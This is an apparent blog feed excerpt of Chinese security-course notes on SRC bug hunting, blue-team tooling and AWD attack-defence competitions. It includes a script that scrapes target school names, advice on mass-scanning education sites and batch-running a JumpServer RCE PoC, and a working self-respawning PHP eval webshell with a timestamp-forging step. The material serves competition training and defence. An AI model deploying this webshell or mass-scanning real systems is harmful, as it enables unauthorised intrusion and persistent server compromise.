    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/</id>
    <published>2023-05-23T15:17:30.681Z</published>
    <updated>2023-05-23T15:27:23.350Z</updated>
    
    <content type="html"><![CDATA[<p>86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</p><span id="more"></span><p>图片</p><p>图片</p><p><strong>案例1：Python-Foda-Xray联动常规批量自动化</strong></p><p>写Python脚本，将教育行业漏洞报告平台上的所有学校都爬下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_edu_name</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">196</span>):</span><br><span class="line">        url = <span class="string">&quot;https://src.sjtu.edu.cn/rank/firm/?page=&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(url).content.decode(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">            soup = etree.HTML(result)</span><br><span class="line">            name = soup.xpath(<span class="string">&#x27;//td[@class=&quot;am-text-center&quot;]/a/text()&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            name = <span class="string">&#x27;\n&#x27;</span>.join(name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;edu_name.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(name +<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_edu_name()</span><br></pre></td></tr></table></figure><p>或者也可以在fofa上搜索（需要买会员）</p><p>图片</p><p>图片</p><p>结果爬下来173861个教育网站地址。</p><p>图片</p><p>域名都爬下来之后，用xray，awvs等工具进行批量测试。</p><p><strong>案例2：Python-Foda-Exploit联动定点批量自动化</strong></p><p>在seebug（<a href="https://www.seebug.org/%EF%BC%89%E4%B8%8A%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E6%96%B0%E7%9A%84%E6%9C%89POC%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%AF%B9POC%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%BD%BF%E4%B9%8B%E5%8F%AF%E4%BB%A5%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E3%80%82%E6%AF%94%E5%A6%82jumpserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://www.seebug.org/）上找到一个最新的有POC的漏洞，对POC二次开发使之可以批量测试。比如jumpserver远程命令执行漏洞</a></p><p>图片</p><p>在fofa上搜索使用jumpserver的教育行业网站，找到3个网站使用了jumpserver。</p><p>图片</p><p>对这3个网站使用poc自动化定点测试。</p><p>也可以去网上（<a href="https://github.com/TimelineSec/2020-Vulnerabilities%EF%BC%89%E5%B0%86%E6%9C%80%E8%BF%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%EF%BC%8C%E5%86%99python%E8%84%9A%E6%9C%AC%EF%BC%8C%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/TimelineSec/2020-Vulnerabilities）将最近的漏洞详情下载下来，写python脚本，批量检测。</a></p><p>图片</p><p>注意：盒子、补天等众测平台的漏洞不能批量扫描，只能人工测试。</p><p><strong>案例3：Python-Foda-平台默认口令安全批量自动化</strong></p><p>思路与上述类似，下面网址列出来大部分设备的默认口令：</p><p><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;86-SRC挖掘-教育行业平台&amp;amp;规则&amp;amp;批量自动化&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全（SRC挖掘）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</id>
    <published>2023-05-23T15:15:21.170Z</published>
    <updated>2023-05-23T15:17:00.521Z</updated>
    
    <content type="html"><![CDATA[<p>82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</p><p>图片</p><p>图片</p><p>图片</p><p>必备知识点：</p><p>在每年的安全活动中，红蓝队的职责，其中大部分强调学习红队技术，那么蓝队技术又有哪些呢？简要来说蓝队就是防守，涉及到应急、溯源、反制、情报等综合性认知和操作能力知识点。掌握红队攻击技术的前提下，蓝队技术能提升一个档次哦。</p><p>本课知识点：</p><ol><li>认识ATT&amp;CK框架技术</li><li>认识对抗的蜜罐技术的本质</li><li>掌握WAF安全产品部署及应用</li><li>掌握IDS在对抗中的部署使用</li><li>掌握威胁情报平台对应报告分析</li><li>作为一名干饭人要掌握的报告书写专业性</li></ol><p>本课重点：</p><ul><li>案例1：专业用语-ATT&amp;CK技术简要介绍-报告书写</li><li>案例2：掌握了解-安全攻防蜜罐技术的利用-配合威胁</li><li>案例3：攻击拦截-WAF安全产品部署及反制-多种中间件</li><li>案例4：追踪反制-HIDS入侵检测系统部署测试-爆破|提权|规则</li><li>案例5：应急溯源-威胁情报平台对于溯源分析意义-CS后门溯源</li></ul><p><strong>案例1：专业用语-ATT&amp;CK技术简要介绍-报告书写</strong></p><p>原版：<a href="https://attack.mitre.org/matrices/enterprise">https://attack.mitre.org/matrices/enterprise</a></p><p>国内有ATT&amp;CT参考手册，可以下载参考学习。</p><p><strong>案例2：掌握了解-安全攻防蜜罐技术的利用-配合威胁</strong></p><p>Hfish部署配合在线威胁平台实现自动分析，记录攻击者攻击手法及攻击过程，攻击IP等信息可作为黑名单。</p><p><a href="https://hfish.io/index.html">https://hfish.io/index.html</a></p><p><a href="https://github.com/hacklcx/HFish">https://github.com/hacklcx/HFish</a></p><p>图片</p><p><strong>案例3：攻击拦截-WAF安全产品部署及反制-多种中间件</strong></p><p>Openrasp-PHP,Java网站应用防护，多种中间件</p><p><a href="https://rasp.baidu.com/doc/">https://rasp.baidu.com/doc/</a></p><p>安全狗支持的中间件比较少，推荐使用Openrasp。</p><p>图片</p><p>部署OpenRasp之后，网站数据包会携带请求头X-Protected-By:OpenRasp，我们测试的时候可以留意一下。</p><p>还有默安和长亭蜜罐。</p><p><strong>案例4：追踪反制-HIDS入侵检测系统部署测试-爆破|提权|规则</strong></p><p>NIDS&amp;HIDS</p><ul><li>NIDS：网络入侵检测系统</li><li>HIDS：主机入侵检测系统</li></ul><p>这里介绍两款HIDS：yulong-hids（国产）、wazuh（国外，推荐）</p><ul><li><p>yulong-hids：优点：中文规则说明等-规则</p></li><li><ul><li><a href="https://github.com/ysrc/yulong-hids">https://github.com/ysrc/yulong-hids</a></li></ul></li><li><p>wazuh：ELK日志，攻击行为分析等-爆破|提权</p></li><li><ul><li>实现入侵行为分析，日志实时监控，规则触发拦截等功能</li><li><a href="https://documentation.wazuh.com/4.0/index.html">https://documentation.wazuh.com/4.0/index.html</a></li></ul></li></ul><p>驭龙HIDS规则引擎（可自己添加规则）</p><p>图片</p><p><strong>案例5：应急溯源-威胁情报平台对于溯源分析意义-CS后门溯源</strong></p><p>参考：值得推荐的威胁情报平台–2020.10更新 <a href="https://blog.csdn.net/qq_29277155/article/details/79830927">https://blog.csdn.net/qq_29277155/article/details/79830927</a></p><p>威胁情报是指：基于一定知识的证据，已经存在或正在形成的潜在威胁，比如，上下文、机制、指标、意义以及可实施的建议，利用这些，可以帮助当事人形成应对这些危险的决策。</p><p>预测（基于数据）将要来临的的攻击。威胁情报利用公开的可用资源，预测潜在的威胁。网络威胁情报可以帮助你在防御方面做出更好的决策，可以得到以下好处。</p><ul><li>组建一个安全预警机制，在攻击发起之前知道它</li><li>对安全事件提出更好的解决方案</li><li>网络威胁情报为你提供最新的安全技术信息，帮助封锁出现的威胁</li><li>对相关的危险进行调查，开展利益分析</li><li>要寻找什么：恶意IP地址、域名&#x2F;网站、文件哈希（恶意软件分析）、受害领域&#x2F;国家</li></ul><p>威胁情报平台</p><ul><li><p>微步威胁平台：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></li><li><ul><li>中国首家专业的威胁情报公司。它是国内第一个综合性的威胁分析平台，秉承公开、免费、自由注册的原则，为全球的安全分析人员提供了一个便利的一站式威胁分析平台，用来进行事件响应过程的工作，包括：事件确认、危险程度和影响分析、关联及溯源分析等。</li><li>主要特征如下：自由公开的服务、多引擎文件检测、行为沙箱、集成互联网基础数据、集成开源情报信息、关联分析、机器学习、可视化分析</li></ul></li><li><p>奇安信威胁情报中心：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p></li><li><ul><li>360 Alpha威胁分析平台，是360企业安全为安全分析师提供一站式分析工具（云端SaaS平台），具备完备的威胁情报和互联网基础数据，在数据覆盖度、信息种类、数据的时间&#x2F;空间跨度都具备较大优势。</li><li>在功能方面，Alpha平台包括有4大模块：威胁研判模块可以直接判定报警真实性、了解攻击团伙&#x2F;软件的意图和能力，进而快速筛选出真实、重要的报警；威胁关联分析模块，针对无法直接判定的分析对象，可一键自动化分析域名、IP、注册信息和样本间的关联信息，同时还可以生成攻击者画像信息；文件深度分析模块，用于了解恶意软件的详细的静态、动态行为，并提取IOC形成自己的威胁情报；分析任务管理模块可以将一次攻击事件所涉及到的域名、IP、样本等信息进行整合并统一管理，后续还可以依照标准威胁情报格式STIX，进行威胁情报分享。</li></ul></li><li><p>360威胁情报中心 <a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p></li><li><ul><li>360旗下的威胁情报中心，可以根据IP、Domain、 HASH(MD5,SHA1,SHA256)、CA(MD5,SHA1,SHA256,SKID)查询威胁情报。</li></ul></li><li><p>绿盟 威胁情报中心：<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a></p></li><li><ul><li>绿盟科技旗下的威胁情报中心，支持中文搜索，但是需要注册登录查看更多的信息</li><li>主要特征如下：输入客户名称、安全事件名称、攻击组织名称、攻击工具名称、IPv4、IPv6、域名、漏洞名称&#x2F;编号、文件Hash（MD5&#x2F;SHA256） 或任意关键字</li></ul></li><li><p>VenusEye威胁情报中心：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></p></li><li><ul><li>VenusEye威胁情报中心是由启明星辰集团倾力打造的集威胁情报收集、分析、处理、发布和应用为一体的威胁情报云服务平台，提供威胁情报数据、系统、技术和专业能力的输出。</li><li>主要特征如下：IP、域名、文件HASH(MD5&#x2F;SHA1&#x2F;SHA256)、邮箱、证书指纹（SHA1）</li></ul></li><li><p>安恒威胁情报中心 ：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></p></li><li><ul><li>提供海量内外部威胁情报数据、恶意样本行为数据、黑客组织画像信息等查询服务， 帮助安全运营者对攻击报警进行研判，通过多源情报关联信息， 挖掘攻击事件背后的动机</li><li>主要特征如下：域名、IP、邮箱、文件Hash、字符串</li></ul></li><li><p>360网络安全研究：<a href="http://netlab.360.com/">http://netlab.360.com/</a></p></li><li><ul><li>360旗下的安全实验室，擅长从全球流量动态分析漏洞蠕虫木马等恶意攻击行为，并且联合历史流量、情报信息进行综合分析。</li><li>主要特征如下：被动DNS检测（<a href="https://passivedns.cn/%EF%BC%89%E3%80%81DDOS%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB%E7%BA%AA%E5%BD%95%EF%BC%88https://ddosmon.net/%EF%BC%89%E3%80%81%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7%EF%BC%88https://scan.netlab.360.com/%EF%BC%89%E3%80%81%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%EF%BC%88EK">https://passivedns.cn/）、DDOS恶意攻击纪录（https://ddosmon.net/）、网络扫描行为监控（https://scan.netlab.360.com/）、开源情报信息（EK</a>, DNS DGA, MalConn(sample network behaviour), Mirai scanner, Mirai C2 and DRDoS Reflector）（<a href="https://scan.netlab.360.com/%EF%BC%89">https://scan.netlab.360.com/）</a></li></ul></li><li><p>AlienVault : <a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></p></li><li><ul><li>可以访问威胁研究专家和安全专家全球社区。它递送社区产生的威胁数据，能够协作各个来源的威胁数据，自动更新你的安全基础设施。其收购了threatcrowd，拥有IP、域名、文件、邮件等情报</li><li>主要特征如下：垃圾和钓鱼页面、恶意软件和间谍软件、匿名代理攻击和P2P网络、暗网IP地址（使用TOR）、管理僵尸网络的C&amp;C服务器、域名、IP地址、邮件地址、文件哈希、杀软检测（<a href="https://www.threatcrowd.org/%EF%BC%89">https://www.threatcrowd.org/）</a></li></ul></li><li><p>ISC SANS威胁检测： <a href="https://isc.sans.edu/">https://isc.sans.edu/</a></p></li><li><ul><li>在成功检测，分析和发布Li0n蠕虫警告后，ISC于2001年创建， 今天，ISC为成千上万的互联网用户和组织提供免费的分析和警告服务，并且正在积极与互联网服务提供商合作，以打击最恶意的攻击者。</li><li>主要特征如下：关键词、IP、域名、页头</li></ul></li><li><p>RedQueen安全智能服务平台：<a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></p></li><li><ul><li>天际友盟的情报应用解决方案已在国内多家政府机构，以及金融、互联网、通信、能源等行业的多家龙头企业得到实践，通过综合应用多项业内领先的情报应用技术，为服务的客户切实解决了多项重点、难点安全问题，辅助企业持续完善安全体系，提升安全能力，彰显安全价值。</li><li>未来，天际友盟还将继续秉承“应用安全情报，解决实际问题”的品牌理念，从客户的实际问题出发，深耕安全情报技术的实践应用，与客户及众多合作伙伴一道，为打造更安全的未来而努力。</li><li>主要特征如下：安全情报、漏洞情报、最新资讯、威胁溯源、自由公开的服务、集成互联网基础数据、集成开源情报信息、关联分析、机器学习、可视化分析</li></ul></li><li><p>IBM情报中心：<a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></p></li><li><ul><li>BM X-Force Exchange 是一款基于云的威胁情报共享平台，支持使用、共享威胁情报并采取行动。它支持快速搜索全球最新安全威胁，汇总可操作情报、向专家咨询并与同行进行合作。IBM X-Force Exchange 由人员和机器生成的情报支持，可利用 IBM X-Force 的规模来帮助用户在新兴威胁面前保持领先地位。</li></ul></li></ul><p>威胁情报一直是安全行业热议的话题，实际上在国内的发展还比较初级。威胁情报具有优秀的预警能力、快速响应能力，并且能改善管理层之间的沟通、加强策略规划和投资。但是大部分企业机构并不具备充分利用威胁情报的能力：1.数据量太大且过于复杂；2.拥有相关知识的人才匮乏。</p><ul><li>日常应用：在安全事件、应急响应中，获取威胁情报，作为重要证据，辅助事件处置</li><li>高级应用：集成到企业安全管理平台提高监控预警响应能力、结合威胁数据和其他解决方案实现数据安全、优秀的数据展示功能</li><li>github链接：<a href="https://github.com/ym2011/SecurityTechnique/blob/master/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5.xmind">https://github.com/ym2011/SecurityTechnique/blob/master/威胁情报/威胁情报.xmind</a></li></ul><p>案例演示</p><p>利用CobaltStrike生成的后门文件进行平台分析展示</p><p>利用威胁情报平台实现对未知文件及未知URL等信息进行分析溯源</p><p>图片</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;82-红蓝对抗-蓝队att&amp;amp;ck&amp;amp;IDS&amp;amp;蜜罐&amp;amp;威胁情报&lt;/p&gt;
&lt;p&gt;图片&lt;/p&gt;
&lt;p&gt;图片&lt;/p&gt;
&lt;p&gt;图片&lt;/p&gt;
&lt;p&gt;必备知识点：&lt;/p&gt;
&lt;p&gt;在每年的安全活动中，红蓝队的职责，其中大部分强调学习红队技术，那么蓝队技术又有哪些</summary>
      
    
    
    
    <category term="小迪安全（AWD红蓝对抗）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/</id>
    <published>2023-05-23T15:11:59.107Z</published>
    <updated>2023-05-23T15:15:07.441Z</updated>
    
    <content type="html"><![CDATA[<p>81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</p><span id="more"></span><p><strong>本课重点：</strong></p><ul><li>案例1：防守-流量监控-实时获取访问数据包流量</li><li>案例2：攻击-权限维持-不死脚本后门生成及查杀</li><li>案例3：其他-恶意操作-搅屎棍发包回首掏共权限</li><li>案例4：准备-漏洞资源-漏洞资料库及脚本工具库</li></ul><p><strong>案例1：防守-流量监控-实时获取访问数据包流量</strong></p><p>利用 WEB 访问监控配合文件监控能实现 WEB 攻击分析及后门清除操作，确保写入后门操作失效，也能确保分析到无后门攻击漏洞的数据包便于后期利用。</p><p>上传文件监控脚本log-record.php，该脚本需要在网站配置文件footer.php中包含一下，否则无法正常调用运行。</p><p>图片</p><p>之后一旦有人访问了系统，它就会在&#x2F;tmp&#x2F;目录下生成一个log日志。</p><p>接下来我们就可以实时监控该日志。</p><p>图片</p><p>分析日志，就可以知道别人对自己网站实施了哪些攻击，若攻击成功，说明有漏洞。相应的可以对其进行防护，也可以利用该攻击方法去攻击别人。</p><ul><li>1.分析有后门或无后门的攻击行为数据包找到漏洞进行修复</li><li>2.分析到成功攻击的数据包进行自我利用，用来攻击其他队伍</li></ul><p><strong>案例2：攻击-权限维持-不死脚本后门生成及查杀</strong></p><p>在攻击利用后门获取 Flag 时，不死后门的权限维持尤为重要，同样防守方也要掌握对其不死后门的查杀和利用，这样才能获取更高的分数，对比文件监控前后问题。</p><p>不死马.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//进程运行</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如何杀死不死马？</p><p>图片</p><p>monitor.py开启之前，写入不死后门，monitor.py无法对其查杀，不死后门有作用；</p><p>monitor.py开启之后，写入不死后门，monitor.py可以对其查杀，不死后门无作用。</p><p><strong>案例3：其他-恶意操作-搅屎棍发包回首掏共权限</strong></p><p>作为各种技术大家都要用的情况下，一个好的攻击漏洞和思路不被捕获和发现，一个好的套路浪费对手的时间，搅屎棍发包回首掏共权限利用思路可以尝试使用。</p><p>搅屎棍脚本</p><p>图片</p><p>回首掏：配合抓到的真实攻击数据包，利用数据包占用其他人的攻击行为。利用后门去连接其他团队尝试。</p><p><strong>案例4：准备-漏洞资源-漏洞资料库及脚本工具库</strong></p><p>比赛准备：如何收集并整理好漏洞，文档资料，脚本工具等</p><ul><li><p>漏洞库：exploitdb，github 监控最新信息，平常自己收集整理</p></li><li><ul><li><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></li></ul></li><li><p>文档资料：零组类似文档离线版爬虫，各类资料，平常自己收集整理</p></li><li><p>脚本工具：忍者系统配合自己常用工具，github 监控 awd 脚本，收集整理</p></li><li><ul><li>github搜索awd，有很多最新脚本</li></ul></li></ul><p>涉及资源：</p><ul><li>AWD平台搭建 <a href="https://blog.csdn.net/weixin_30367873/article/details/99608419">https://blog.csdn.net/weixin_30367873/article/details/99608419</a></li><li>AWD红蓝对抗资料工具 <a href="https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ">https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ</a> 提取码：xiao</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;81-红蓝对抗-AWD监控&amp;amp;不死马&amp;amp;垃圾包&amp;amp;资源库&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全（AWD红蓝对抗）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>80-红蓝对抗-AWD模式&amp;准备&amp;攻防&amp;监控&amp;批量</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E6%A8%A1%E5%BC%8F&amp;%E5%87%86%E5%A4%87&amp;%E6%94%BB%E9%98%B2&amp;%E7%9B%91%E6%8E%A7&amp;%E6%89%B9%E9%87%8F/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E6%A8%A1%E5%BC%8F&amp;%E5%87%86%E5%A4%87&amp;%E6%94%BB%E9%98%B2&amp;%E7%9B%91%E6%8E%A7&amp;%E6%89%B9%E9%87%8F/</id>
    <published>2023-05-23T15:08:42.869Z</published>
    <updated>2023-05-23T15:15:14.589Z</updated>
    
    <content type="html"><![CDATA[<p>80-红蓝对抗-AWD模式&amp;准备&amp;攻防&amp;监控&amp;批量</p><span id="more"></span><p>思维导图</p><p>图片</p><p>图片</p><p>AWD 常见比赛规则说明：</p><ul><li>Attack With Defence，简而言之就是你既是一个 hacker，又是一个 manager。</li><li>比赛形式：一般就是一个 ssh 对应一个 web 服务，然后 flag 五分钟一轮，各队一般都有自己的初始分数，flag 被拿会被拿走 flag 的队伍均分，主办方会对每个队伍的服务进行 check，check 不过就扣分，扣除的分值由服务 check 正常的队伍均分。其中一半比赛以 WEB 居多，可能会涉及内网安全。攻击和防御大部分为前期培训内容。</li></ul><p>前期准备：</p><ul><li>1.队伍分工明确</li><li>2.脚本工具环境完整</li><li>3.漏洞 POC&#x2F;EXP 库完整</li><li>4.安全防御 WAF 及批量脚本完整</li></ul><p>必备操作：</p><ul><li>1 备份网站文件</li><li>2 修改数据库默认密码</li><li>3 修改网页登陆端一切弱密码</li><li>4 查看是否留有后门账户</li><li>5 关闭不必要端口，如远程登陆端口</li><li>6 使用命令匹配一句话特性</li><li>7 关注是否运行了“特殊”进程</li><li>8 权限高可以设置防火墙或者禁止他人修改本目录</li></ul><p>本课重点：</p><ul><li>案例1：防守-部署 WAF-实现第一时间拦截部分攻击-升级后续版</li><li>案例2：防守-扫描后门-实现第一时间利用预留后门攻击-升级脚本版</li><li>案例3：防守-代码审计-实现第一时间找出源码中安全漏洞-升级漏洞库版</li><li>案例4：防守-文件监控-实现第一时间监控当前目录文件操作-升级流量监控</li><li>案例5：攻击-批量Flag-实现第一时间利用脚本批量 Flag 得分-升级模版不死马</li></ul><p><strong>案例1：防守-部署 WAF-实现第一时间拦截部分攻击-升级后续版</strong></p><p>最快第一时间操作，此类技术核心准备为各个环境的 WAF 部署(源码语言，比赛规则)</p><p>涉及资源：</p><ul><li><a href="https://github.com/zhl2008/awd-platform">https://github.com/zhl2008/awd-platform</a></li><li><a 